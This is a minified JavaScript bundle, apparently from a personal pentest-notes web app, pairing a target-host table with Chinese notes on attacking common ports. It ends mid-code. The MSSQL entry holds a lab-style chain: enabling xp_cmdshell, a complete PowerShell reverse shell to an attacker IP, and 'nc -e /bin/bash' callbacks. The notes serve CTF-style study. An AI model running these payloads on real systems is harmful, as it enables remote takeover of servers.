(window.webpackJsonp=window.webpackJsonp||[]).push([[118],{P9cN:function(j,m,e){"use strict";var P=e("jrin"),n=e("k1fw"),r=e("ysNt"),a=e("Z5EX"),t=e("WHds"),o=e("q1tI"),i=e.n(o),c=e("H16K"),A=e("6EgL"),F=c.a.list,C=c.a.create,y=c.a.update,w=c.a.del,p=function(l){var f=l.projectList,h=l.hideFieldsSearch,I=l.listFilter,E=l.useStoreList,T=l.addReloadFn_toMap,u=l.hidePagination,M=l.hideToolbar,W=l.headerTitle;return i.a.createElement(t.a,{addReloadFn_toMap:T,hideFieldsSearch:h,hidePagination:u,hideToolbar:M,headerTitle:W,handleList:function(s){if(E){var D=A.a.getStore().getState(),k=D.listAndserver.list;return console.log("\u4F7F\u7528state\u6570\u636E",D,k),Promise.resolve(Object(t.b)(k))}else return console.log("\u4F7F\u7528\u63A5\u53E3\u62C9\u53D6\u6570\u636E"),F(s).then(function(x){return Object(t.b)(I?x.filter(I):x)})},handleAdd:C,handleUpdate:y,handleRemove:w,columns:[{title:"\u552F\u4E00ID",dataIndex:"id",valueType:"text",fieldProps:Object(n.a)({},r.a.fieldProps.example("disabled"))},{title:"\u9879\u76EEID",dataIndex:"projectId",valueEnum:f.reduce(function(B,s){return Object(n.a)(Object(n.a)({},B),{},Object(P.a)({},s.id,{text:s.name,status:"Success"}))},{})},{title:"\u521D\u6B65\u771F\u5B9EIP(\u53EF\u4EE5\u901A\u8FC7ping\u51FA)",dataIndex:"trueIP",valueType:"textarea",render:r.a.get_pRenderFn(),fieldProps:Object(n.a)({},r.a.fieldProps.example("autoSize_4_16"))},{title:"\u7CFB\u7EDF\u7C7B\u578B\uFF08CVS\uFF09",dataIndex:"systemType",valueType:"textarea",render:r.a.get_tagsSpanFn(),fieldProps:Object(n.a)({},r.a.fieldProps.example("autoSize_4_16"))},{title:"\u7CFB\u7EDF\u7248\u672C",dataIndex:"systemVersion",valueType:"textarea",render:r.a.get_pRenderFn(),fieldProps:Object(n.a)({},r.a.fieldProps.example("autoSize_4_16"))},{title:"\u5F00\u653E\u7AEF\u53E3\uFF08CVS\uFF09",dataIndex:"openPort",valueType:"textarea",render:r.a.get_tagsSpanFn("port",a.b),fieldProps:Object(n.a)({},r.a.fieldProps.example("autoSize_4_16"))},{title:"\u7F51\u9875\u9632\u706B\u5899",dataIndex:"webAppFirewall",valueType:"textarea",render:r.a.get_pRenderFn(),fieldProps:Object(n.a)({},r.a.fieldProps.example("autoSize_4_16"))},{title:"\u521B\u5EFA\u65F6\u95F4",dataIndex:"createdAt",valueType:"dateTime",hideInForm:!0},{title:"\u66F4\u65B0\u65F6\u95F4",dataIndex:"updatedAt",valueType:"dateTime",hideInForm:!0}]})};m.a=p},Z5EX:function(j,m,e){"use strict";e.d(m,"a",function(){return i}),e.d(m,"b",function(){return A});var P=e("fWQN"),n=e("mtLc"),r=e("q1tI"),a=e.n(r),t=e("ysNt"),o=t.a.singleATag_blank,i={\u5F00\u653E\u76EE\u5F55:{color:"#87d068",desc:"\u5F00\u653E\u76EE\u5F55\u3002\u4E00\u822C\u662F\u3010\u6742\u7269\u95F4\u3011\uFF0C\u53EF\u4EE5\u627E\u5230\u4E00\u4E9B\u610F\u5916\u7684\u60CA\u559C"},\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55:{color:"#f50",desc:"\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55\u3002\u63D0\u4F9B\u4E86\u4E00\u4E9B\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u767B\u5F55\uFF0C\u7136\u540E\u8FDB\u884C\u63A7\u5236\u64CD\u4F5C"}},c=function(){function F(){Object(P.a)(this,F)}return Object(n.a)(F,null,[{key:"checkPortPairs",value:function(y){var w=this;y.forEach(function(p){var S=Array.isArray(p.port)?p.port:[p.port];w.pairs.forEach(function(l){S.forEach(function(f){l.ports.find(function(h){return h===f})&&(p.detail.relatedPorts=l)})})})}}]),F}();c.pairs=[{guess:["1.\u53EF\u80FD\u662F\u3010Domain Controller / \u57DF\u540D\u63A7\u5236\u5668\u3011\u3002",a.a.createElement(a.a.Fragment,null,"2.\u53EF\u4EE5\u8003\u8651\u4F7F\u7528\u3010BloodHound / \u5BFB\u8840\u730E\u72AC\u3011\u3002 \uFF08",o("\u57DF\u6E17\u900F\u5B9E\u6218\u8BE6\u7EC6\u4ECB\u7ECD","https://www.anquanke.com/post/id/230612"),"\uFF09"),"	1.\u53EF\u4EE5\u67E5\u51FA\u975E\u5E38\u591A\u7684\u6743\u9650\u3002\u9010\u6B65\u6DF1\u6316\u3002"],ports:[88,389,5985]},{guess:["\u548C\u3010SAMBA\u3011\u6709\u5173\u3002"],ports:[139,445]}];var A=[{port:[20,21],name:{cn:"FTP",fullForm:"File Transfer Protocol\uFF0C\u6587\u4EF6\u4F20\u8F93\u534F\u8BAE"},platformType:i.\u5F00\u653E\u76EE\u5F55,short:{service:"ftp",baseUsage:"\u7528\u4E8E\u5728\u4E3B\u673A\u4E4B\u95F4\uFF0C\u4F20\u8F93\u6587\u4EF6"},detail:{references:[a.a.createElement(a.a.Fragment,null,"\u7AEF\u53E3\u5229\u7528\uFF1A",o("21 - Pentesting FTP - HackTricks","https://book.hacktricks.xyz/pentesting/pentesting-ftp"))],detailUsage:["1. ftp <\u5730\u5740> \uFF0C\u7136\u540E\u8F93\u5165\u8D26\u53F7\u5BC6\u7801","	1.\u767B\u5F55\u6210\u529F\u540E\uFF0C\u5C31\u53EF\u4EE5\u6267\u884C\u547D\u4EE4\u4E86\u3002","	2.\u5E38\u89C1\u547D\u4EE4\uFF1A","		1.\u3010dir\u3011\uFF0C\u67E5\u770B\u5F53\u524D\u5217\u8868","		2.\u3010get <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0B\u8F7D\u6587\u4EF6",a.a.createElement(a.a.Fragment,null,"2. \u5168\u5C40\u67E5\u627E \uFF08",o("\u8D44\u65991","https://serverfault.com/questions/28568/using-the-find-command-on-the-ftp-server/437649"),"\uFF09"),"	1.\u53EF\u4EE5\u4F7F\u7528\u3010lftp\u3011\u5DE5\u5177\uFF0C\u6765\u8FDB\u884C\u8FDE\u63A5","		1.\u7136\u540E\uFF0C\u4F7F\u7528\u3010find . | grep WORD\u3011\u6307\u4EE4\u3002\uFF08\u548C\u5F80\u5E38\u5927\u4F53\u7C7B\u4F3C\uFF09","			1.\u7ECF\u8FC7\u6D4B\u8BD5\uFF0C\u786E\u5B9E\u6709\u7528\u3002"],weak:["1.\u53EF\u80FD\u5B58\u5728\u3010\u654F\u611F\u6587\u4EF6\u3011\u3001\u3010\u914D\u7F6E\u4FE1\u606F\u3011\u7684\u6CC4\u9732\u3002","2.\u3010anonymous\u3011\u533F\u540D\u767B\u5F55\u3002","	1.\u8D26\u53F7\u5BC6\u7801\u7686\u4E3A\u3010anonymous/anonymous\u3011\u3002"],relatedUtils:["1.\u914D\u5408 \u3010LFI\u3011\u6587\u4EF6\u5305\u542B \uFF0C\u6765\u8FDB\u884C\u4F7F\u7528\u3002","	1.\u5148\u4E0A\u4F20 reverse shell \uFF0C\u518D\u6267\u884C\u3002"]}},{port:22,name:{cn:"SSH",fullForm:"Secure Shell\uFF0C\u8FDC\u7A0B\u8FDE\u63A5"},platformType:i.\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55,short:{service:"ssh\u547D\u4EE4",baseUsage:"\u7528\u4E8E\u8FDE\u63A5\u5230 \u8FDC\u7A0B\u7CFB\u7EDF\uFF0C\u5E76\u6267\u884C\u547D\u4EE4"},detail:{detailUsage:["1.\u3010\u5BC6\u7801\u8FDE\u63A5\u3011","2.\u3010\u79C1\u94A5\u6587\u4EF6\u8FDE\u63A5\u3011"],weak:["1.\u5BFB\u627E\u3010\u8D26\u53F7\u5BC6\u7801\u3011 \u6216 \u3010\u79C1\u94A5\u6587\u4EF6\u3011\uFF0C\u6765\u8FDB\u884C\u767B\u5F55\u3002"],relatedUtils:[]}},{port:23,name:{cn:"Telnet",fullForm:"\uFF1F"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u8FDE\u63A5\u5230 \u8FDC\u7A0B\u7CFB\u7EDF\uFF0C\u5E76\u6267\u884C\u547D\u4EE4\u3002\uFF08\u7C7B\u4F3C\u4E8ESSH\uFF1F\uFF1F\uFF1F\uFF09"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:25,name:{cn:"SMTP",fullForm:"Simple Mail Transfer Protocol\uFF0C\u7B80\u5355\u90AE\u4EF6\u4F20\u8F93\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u53D1\u9001\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:53,name:{cn:"DNS",fullForm:"Domain Name Service\uFF0C\u57DF\u540D\u670D\u52A1\u5668"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u628A \u8BA1\u7B97\u673A\u540D\uFF0C\u8F6C\u6362\u4E3A IP\u5730\u5740\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:69,name:{cn:`\u4F7F\u7528\u3010UDP\u534F\u8BAE\u3011

TFTP`,fullForm:"Trivial File Transfer Protocol\uFF0C\u666E\u901A\u6587\u4EF6\u4F20\u8F93\u534F\u8BAE"},short:{service:"tftp  <ip\u5730\u5740> ",baseUsage:"\u662F\u3010FTP\u3011\u7684\u7B80\u5316\u7248\u672C\u3002\u66F4\u7B80\u5355\uFF0C\u4F7F\u7528UDP\u534F\u8BAE\u3002\u4E0D\u591F\u5B89\u5168\u3002"},detail:{detailUsage:["1.\u9700\u8981\u5B89\u88C5\u3010 sudo apt-get install tftp \u3011\u3002","2.\u5E38\u89C1\u6307\u4EE4\uFF1A","	1.\u3010put <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0A\u4F20\u6587\u4EF6","	2.\u3010get <\u6587\u4EF6\u540D>\u3011\uFF0C\u4E0B\u8F7D\u6587\u4EF6","3.\u9ED8\u8BA4\u76EE\u5F55\u8DEF\u5F84","	1.\u4E00\u822C\u662F\u3010/var/lib/tftpboot\u3011\u3002\u53EF\u4EE5\u4ECE\u8FD9\u70B9\u5165\u624B","		1.\u7ED3\u5408\u3010LFI\u3011\u6587\u4EF6\u5305\u542B \uFF0C\u7B49\u7B49"],weak:[],relatedUtils:["1.\u65B9\u6848\u4E00\uFF1A\u5F88\u591A\u65F6\u5019\uFF0C\u53EF\u4EE5\u548C \u3010LFL/\u672C\u5730\u6587\u4EF6\u5305\u542B\u3011 \u653B\u51FB\uFF0C\u7ED3\u5408\u4E00\u8D77\u4F7F\u7528\u3002"]}},{port:80,name:{cn:"HTTP\u7F51\u9875\u7AEF\u53E3",fullForm:"HyperText Transfer Protocol"},platformType:i.\u5F00\u653E\u76EE\u5F55,short:{service:"Apache\u3001Nginx\u3001Tomcat\uFF0C\u7B49\u7B49",baseUsage:"\u7528\u4E8E\u8BBF\u95EE Web\u670D\u52A1\u5668\uFF0C\u7528\u6765\u8BBF\u95EE\u7F51\u9875\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:["1.\u6253\u5F00BurpSuite","	1.\u68C0\u67E5\u3010\u6574\u4F53\u7ED3\u6784\u3011","	2.\u6536\u96C6\u3010\u591A\u79CD\u63A5\u53E3\u4FE1\u606F\u3011","2.\u8FDB\u5165\u7F51\u9875\uFF0C\u67E5\u770B\uFF1A","	1.\u6536\u96C6\u3010\u4E1A\u52A1\u903B\u8F91\u3011\u3001\u3010\u6574\u4F53\u6D41\u7A0B\u3011","		1.\u7EAF\u624B\u52A8","	2.\u6536\u96C6\u654F\u611F\u4FE1\u606F","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22 admin pass login upload user email","				1.\u6B63\u5219  (admin|pass|login|upload|user|email)","	3.\u6536\u96C6\u5404\u79CD\u5165\u53E3","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<a\u3011 \u6807\u7B7E\u5934","				1.\u6B63\u5219  (<a)","	4.\u67E5\u770B\u4EE3\u7801\uFF0C\u76F8\u5173\u6CE8\u91CA\u3002","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<!\u3011 \u6CE8\u91CA\u5934","				1.\u6B63\u5219  (<!)","	5.\u67E5\u627E\u8F93\u5165\u6846\u3001\u6309\u94AE \uFF08\u53EF\u80FD\u548C\u63A5\u53E3 \u6709\u5173\uFF09","		1.\u90E8\u5206\u81EA\u52A8\uFF1A","			1.\u641C\u7D22\u3010<button\u3011\u3001\u3010<input\u3011\u3001\u3010<form\u3011 \u6807\u7B7E\u5934","				1.\u6B63\u5219  (<button|<input|<form)","	6.\u91CD\u70B9js\u4EE3\u7801\uFF0C\u5BA1\u67E5","		1.\u7EAF\u624B\u52A8\uFF1A","			1.\u6BD4\u5982 index.js main.js entry.js ","3.\u626B\u63CF\u7F51\u7AD9\u76EE\u5F55","	1.\u4F18\u5148\u3010gobuster\u3011"]}},{port:88,name:{cn:"Kerberos",fullForm:"Kerberos"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u4E00\u79CD\u7F51\u7EDC\u8EAB\u4EFD\u9A8C\u8BC1\u534F\u8BAE\u3002\uFF1F\uFF1F"},detail:{detailUsage:["1.\u975E\u5E38\u503C\u5F97\u68C0\u67E5 Kerberos \u7684\u3010pre-authentication\u3011\uFF0C\u662F\u5426\u88AB\u7981\u7528\uFF1F","	1.\u4E00\u65E6\u88AB\u7981\u7528\uFF0C\u4F60\u5C31\u4E2D\u5956\u4E86\uFF01","		1.\u76F4\u63A5\u5F00\u542F\u3010ASREPRoasting\u3011\u653B\u51FB\uFF0C\u53EF\u4EE5\u9A6C\u4E0A\u62FF\u4E0B","	2.\u4F7F\u7528\u3010\u3011"],weak:[],relatedUtils:[]}},{port:110,name:{cn:"POP3",fullForm:"Post Office Protocol\uFF0C\u90AE\u5C40\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u63A5\u6536\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:113,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:123,name:{cn:"NTP",fullForm:"Network Time Protocol\uFF0C\u7F51\u7EDC\u65F6\u95F4\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u540C\u6B65\u7CFB\u7EDF\u65F6\u95F4\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:135,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:139,name:{cn:"NETBIOS",fullForm:"Network Basic Input/Output System\uFF0C\u7F51\u7EDC\u57FA\u672C\u8F93\u5165\u8F93\u51FA\u7CFB\u7EDF"},short:{service:["SAMBA\u76F8\u5173","\u2026\u2026\u2026\u2026"],baseUsage:"\u3010\u57FA\u4E8EIP\u7684NBT\u3011\uFF0C\u7528\u4E8E\u5C40\u57DF\u7F51\u901A\u4FE1\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:143,name:{cn:"IMAP",fullForm:"Internet Message Access Protocol\uFF0C\u56E0\u7279\u7F51\u90AE\u4EF6\u8BBF\u95EE\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u63A5\u6536\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:[161,162],name:{cn:"SNMP",fullForm:"Simple Network Management Protocol\uFF0C\u7B80\u5355\u7F51\u7EDC\u7BA1\u7406\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u6536\u96C6\u7F51\u7EDC\u8BBE\u5907\u7684\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:389,name:{cn:"LDAP",fullForm:"Lightweight Directory Access Protocol\uFF0C\u8F7B\u91CF\u7EA7\u76EE\u5F55\u8BBF\u95EE\u534F\u8BAE"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u7528\u4E8E\u63D0\u4F9B\u4E00\u4E9B\u7F51\u7EDC\u76F8\u5173\u7684\u4FE1\u606F\uFF0C\u4F8B\u5982\u7F51\u7EDC\u8D26\u6237\u7684\u4FE1\u606F\u3002\u7EF4\u62A4\u5206\u5E03\u5F0F\u76EE\u5F55\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:443,name:{cn:"",fullForm:""},platformType:i.\u5F00\u653E\u76EE\u5F55,short:{service:"",baseUsage:"\u7528\u4E8E\u5728 \u52A0\u5BC6\u7684\u8FDE\u63A5\u4E0A\uFF0C\u8BBF\u95EE\u3010Web\u670D\u52A1\u5668\u3011\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:445,name:{cn:"SMB\u670D\u52A1",fullForm:"ServerMessageBlock\u670D\u52A1\u6D88\u606F\u5757"},platformType:i.\u5F00\u653E\u76EE\u5F55,short:{service:["SAMBA\u76F8\u5173","microsoft-ds"],baseUsage:"\u3010\u57FA\u4E8EIP\u7684SMB\u3011\uFF0C\u5728 Linux\u3001Windows \u4E2D\uFF0C\u7528\u4E8ESMB\u6587\u4EF6\u5171\u4EAB"},detail:{detailUsage:[],weak:["1.\u53EF\u80FD\u5141\u8BB8\u533F\u540D\u8BBF\u95EE","2.\u800C\u3010\u5171\u4EAB\u6587\u4EF6\u3011\uFF0C\u7ECF\u5E38\u5B58\u50A8\u7740 \u542B\u6709\u5BC6\u7801\u3001\u5176\u5B83\u654F\u611F\u4FE1\u606F \u7684\u914D\u7F6E\u6587\u4EF6","3."],relatedUtils:["\u68C0\u6D4B\u7248\u672C","	1.\u3010msf > use _auxiliary/scanner/smb/smb_version\u3011","		1.\u68C0\u6D4B\u51FA\u7ED3\u679C\u3002",a.a.createElement(a.a.Fragment,null,"\u3010\u67E5\u770B\u5171\u4EAB\u3011smbclient -N -L \\\\\\\\","<IP\u5730\u5740>","\\\\"),"	1.\u7279\u522B\u6CE8\u610F\uFF1A","		1.\u3010IP\u5730\u5740\u3011\u548C\u3010\u53CD\u659C\u6760\u3011\u4E2D\u95F4\u6CA1\u6709\u7A7A\u683C\u3002"," ",a.a.createElement(a.a.Fragment,null,"\u3010\u67E5\u770B\u5171\u4EAB\u3011smbclient -N \\\\\\\\","<IP\u5730\u5740>","\\\\","<\u5206\u4EAB\u540D>"),"	1.\u7279\u522B\u6CE8\u610F\uFF1A","		1.\u3010IP\u5730\u5740\u3011\u548C\u3010\u53CD\u659C\u6760\u3011\u4E2D\u95F4\u6CA1\u6709\u7A7A\u683C\u3002","	\u8FDB\u5165\u3010\u64CD\u4F5C\u6A21\u5F0F\u3011","	dir","		\u67E5\u770B\u5F53\u524D\u76EE\u5F55 \u6587\u4EF6\u5217\u8868","	get <\u6587\u4EF6\u540D>","		\u4E0B\u8F7D\u6587\u4EF6\uFF0C\u9ED8\u8BA4\u662F\u3010\u8FDB\u5165smb\u524D\u3011\u7684\u5F53\u524D\u76EE\u5F55\u3002"]}},{port:465,name:{cn:"SMTPS",fullForm:"Simple Mail Transfer Protocol Secure\uFF0C\u7B80\u5355\u90AE\u4EF6\u4F20\u8F93\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u53D1\u9001\u52A0\u5BC6\u7535\u5B50\u90AE\u4EF6\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:514,name:{cn:"Syslog",fullForm:"System Log\uFF0C\u7CFB\u7EDF\u65E5\u5FD7"},short:{service:"",baseUsage:"\u7528\u4E8E\u628A\u7CFB\u7EDF\u65E5\u5FD7\u53D1\u9001\u5230\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:636,name:{cn:"LDAPS",fullForm:"Lightweight Directory Access Protocol Secure\uFF0C\u8F7B\u91CF\u7EA7\u76EE\u5F55\u8BBF\u95EE\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u901A\u8FC7 \u52A0\u5BC6\u7684\u8FDE\u63A5 \u4F7F\u7528\u3010LDAP\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:993,name:{cn:"IMAPS",fullForm:"Internet Message Access Protocol Secure\uFF0C\u56E0\u7279\u7F51\u90AE\u4EF6\u8BBF\u95EE\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u901A\u8FC7 \u52A0\u5BC6\u7684\u8FDE\u63A5 \uFF0C\u4F7F\u7528\u3010IMAP\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:995,name:{cn:"POP3S",fullForm:"Post Office Protocol Secure\uFF0C\u90AE\u5C40\u3010\u5B89\u5168\u3011\u534F\u8BAE"},short:{service:"",baseUsage:"\u7528\u4E8E\u5728 \u52A0\u5BC6\u7684\u8FDE\u63A5 \u4E0A\uFF0C\u4F7F\u7528\u3010POP3\u3011\u534F\u8BAE\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:1433,name:{cn:"mssql",fullForm:"Microsoft SQL Server \u5FAE\u8F6FSQL\u670D\u52A1\u5668"},platformType:i.\u8FDC\u7A0B\u8FDE\u63A5\u767B\u5F55,short:{service:"ms-sql-s",baseUsage:"\u5FAE\u8F6F\u81EA\u5BB6\u7684SQL\u670D\u52A1\u5668"},detail:{detailUsage:[],weak:["\u8FDC\u7A0B\u8FDE\u63A5\u540E\uFF0C\u53EF\u4F7F\u7528SQL\u6240\u5728\u7528\u6237\uFF0C\u6267\u884CWindows\u547D\u4EE4"],relatedUtils:[a.a.createElement(a.a.Fragment,null,"Impacket - mssqlclient.py \uFF08",o("\u5B98\u65B9\u8D44\u6599","https://github.com/SecureAuthCorp/impacket"),"\uFF09"),"	\u5B89\u88C5\u65B9\u5F0F\uFF1A","		1.\u4E0B\u8F7D\u538B\u7F29\u5305\uFF0C\u6216GitHub\u4ED3\u5E93\u6E90\u7801\uFF1A","			1.\u65B9\u5F0F\u4E00\uFF1A\u4E0B\u8F7D\u3010Release\u3011\u538B\u7F29\u5305\uFF0C\u89E3\u538B\u7F29\u3002","			2.\u65B9\u5F0F\u4E8C\uFF1A\u4E0B\u8F7DGitHub\u4ED3\u5E93\uFF0C\u3010git clone https://github.com/SecureAuthCorp/impacket.git\u3011","		2.\u6267\u884C\u3010pip3 install . \u3011\uFF0C\u5B89\u88C5\u5FC5\u9700\u4F9D\u8D56\u3002","	\u6267\u884C\u65B9\u5F0F\uFF1A","		python3 ./examples/mssqlclient.py sql_svc@10.10.10.27 -windows-auth","			\u5E94\u8BE5\u4F7F\u7528\u3010sql_svc@10.10.10.27\u3011\uFF0C\u800C\u4E0D\u662F\u3010ARCHETYPE/sql_svc@10.10.10.27\u3011",a.a.createElement(a.a.Fragment,null,"				","\u4E0D\u7136\u4F1A\u62A5\u9519\u3010Login failed for user 'ARCHETYPE\\Guest'\u3011\u3002\uFF08",o("\u94FE\u63A51","https://forum.hackthebox.eu/discussion/comment/72514/#Comment_72514"),"\u3001",o("\u94FE\u63A52","https://github.com/SecureAuthCorp/impacket/issues/613"),"\uFF09"),"		SELECT IS_SRVROLEMEMBER('sysadmin')","			\u67E5\u770B\u662F\u5426\u3010\u7CFB\u7EDF\u7BA1\u7406\u5458\u3011",`		
        EXEC sp_configure 'Show Advanced Options', 1;
        reconfigure;
        sp_configure;
        EXEC sp_configure 'xp_cmdshell', 1
        reconfigure;
        xp_cmdshell "whoami"
        `,"			\u3010EXEC sp_configure <\u952E> <\u503C>\u3011 \u66F4\u6539\u8BBE\u7F6E","			\u3010reconfigure\u3011 \u91CD\u65B0\u52A0\u8F7D\u8BBE\u7F6E\uFF0C\u4EE5\u751F\u6548","			\u3010sp_configure\u3011 \u67E5\u770B\u8BBE\u7F6E","			\u3010xp_cmdshell <\u547D\u4EE4>\u3011 RCE\u8FDC\u7A0B\u6267\u884C\u547D\u4EE4","		\u653E\u7F6E\u3010Windows Shell\u3011\u6587\u4EF6","			\u811A\u672C\u5185\u5BB9\uFF1A",'				$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',"			\u67B6\u8BBE\u65B9\u5F0F\u4E00\uFF1A\u672C\u5730Python\u67B6\u8BBE","			\u67B6\u8BBE\u65B9\u5F0F\u4E8C\uFF1A\u516C\u7F51\u670D\u52A1\u5668\u67B6\u8BBE","		\u4F7F\u7528NC\u53CD\u5411\u8FDE\u63A5","			\u6D4B\u8BD5\u8FDE\u901A\u6027\uFF1A","				\u672A\u5F00\u542F\u3010nc\u76D1\u542C\u3011\uFF1A","					\u3010nc 104.198.9.12 20443\u3011\uFF0CConnection timed out","					\u3010nc 104.198.9.12 20443 -e /bin/bash\u3011\uFF0CConnection timed out","				\u5DF2\u5F00\u542F\u3010nc\u76D1\u542C\u3011","					\u3010nc 104.198.9.12 20443\u3011\uFF0CConnection refused","					\u3010nc 104.198.9.12 20443 -e /bin/bash\u3011\uFF0CConnection refused","				\u6B64\u65F6\uFF0C\u9700\u8981\uFF1A","					","			\u6700\u540E\u6307\u4EE4\uFF1Anc -lvnp 443","			FAQ\uFF1A","				\u3010nc -lvnp 443\u3011\uFF0C\u65E0\u6CD5\u63A5\u53D7\u5230\u4EFB\u4F55\u4FE1\u53F7\uFF1F","					1.\u5C1D\u8BD5\u65B9\u6848\u4E00\uFF1A\u8BBE\u7F6E\u3010ufw\u3011\u9632\u706B\u5899","					2.\u5C1D\u8BD5\u65B9\u6848\u4E8C\uFF1A\u8BBE\u7F6E\u3010firewalld\u3011\u9632\u706B\u5899","					3.\u5C1D\u8BD5\u65B9\u6848\u4E09\uFF1A\u8BBE\u7F6E\u3010\u5E73\u53F0\u9632\u706B\u5899\u3011","					4.\u6700\u7EC8\u6210\u529F\u65B9\u6848\u4E00\uFF1A\u3010CentOS\u3011\u4E0D\u884C\uFF0C\u3010Ubuntu\u3011\u884C\u3002","			\u6210\u529F\u4F8B\u5B50\uFF1A","				\u6700\u7EC8\uFF0C\u4F7F\u7528\u3010\u8C37\u6B4C\u4E91 \u7684 Ubuntu 16.04 LTS\u3011\uFF0C\u9ED8\u8BA4\u521D\u59CB\u5316\u914D\u7F6E\u60C5\u51B5\u4E0B\uFF0C\u8FD0\u884C\u3010nc -lvnp 443\u3011","					1.\u6B64\u65F6\uFF0CKali\u4F7F\u7528\u3010nc 104.198.9.12 443\u3011\uFF0CUbuntu\u7684\u76D1\u542C\u63A5\u6536\u5230\u4E86\u3010Connection from [120.229.65.12] port 443 [tcp/*] accepted (family 2, sport 19720)\u3011","					2.\u6709\u4E86\u8FDE\u63A5\u63D0\u793A\u540E\uFF0C\u6211\u4EEC\u53EF\u4EE5\u76F4\u63A5\u8F93\u5165\u3010\u547D\u4EE4\u811A\u672C\u3011\u4E86\u3002","						1.\u5148\u5728\u3010\u672C\u673AWin10\u3011\u6D4B\u8BD5","						2.\u518D\u5728\u3010\u9776\u673AWin Server\u3011\u6D4B\u8BD5","					3.\u6D4B\u8BD5 xp_cmdshell \u7684\u3010\u7F51\u7EDC\u8FDE\u901A\u6027\u3011\uFF1A",'						1. xp_cmdshell " ping 104.198.9.12 "',"							2. \u5982\u679C\u3010\u9776\u673A\u3011\u65E0\u6CD5\u8FDE\u63A5\u4F60\u7684\u3010\u8C37\u6B4C\u4E91\u516C\u7F51IP\u3011\uFF0C\u90A3\u5C31\u6709\u9EBB\u70E6\u4E86\u3002","						2. \u800C\u5982\u679C\u3010\u8C37\u6B4C\u4E91\u516C\u7F51IP\u3011\u65E0\u6CD5\u8FDE\u63A5\uFF0C\u90A3\u5C31\u53EA\u80FD\u3010\u5B8C\u5168\u4F9D\u8D56xp_cmdshell\u3011\u4E86\u3002","							1. \u4E3B\u8981\u5C31\u662F\u9EBB\u70E6\u70B9\u513F\u3002","			","			","		\u5173\u95ED\u6216\u653E\u5F00\u9632\u706B\u5899",a.a.createElement(a.a.Fragment,null,"			","\u3010ufw\u3011\uFF1A \uFF08",o("\u8D44\u65991","https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04"),"\uFF09"),"				1.\u5982\u679C\u6CA1\u6709\u5B89\u88C5\uFF1A\u3010yum install ufw\u3011","				2.\u5982\u679C\u6CA1\u6709\u5F00\u542F\uFF1A","					1.\u62A5\u9519\u3010problem running\u3011","					2.\u542F\u7528\uFF1A\u3010sudo ufw enable\u3011","				3.\u5728\u89C4\u5219\u4E2D\uFF0C\u653E\u884C\u7AEF\u53E3\uFF1Aufw allow 10.10.10.27 proto tcp to any port 80,443"," ","			CentOS\u7684\u3010firewall\u3011","				1.\u67E5\u770B\u72B6\u6001\uFF1A\u3010sudo firewall-cmd --state\u3011","				2.\u5F00\u542F\uFF1A\u3010systemctl start firewalld\u3011","				3.\u5173\u95ED\uFF1A\u3010systemctl stop firewalld\u3011",a.a.createElement(a.a.Fragment,null,"		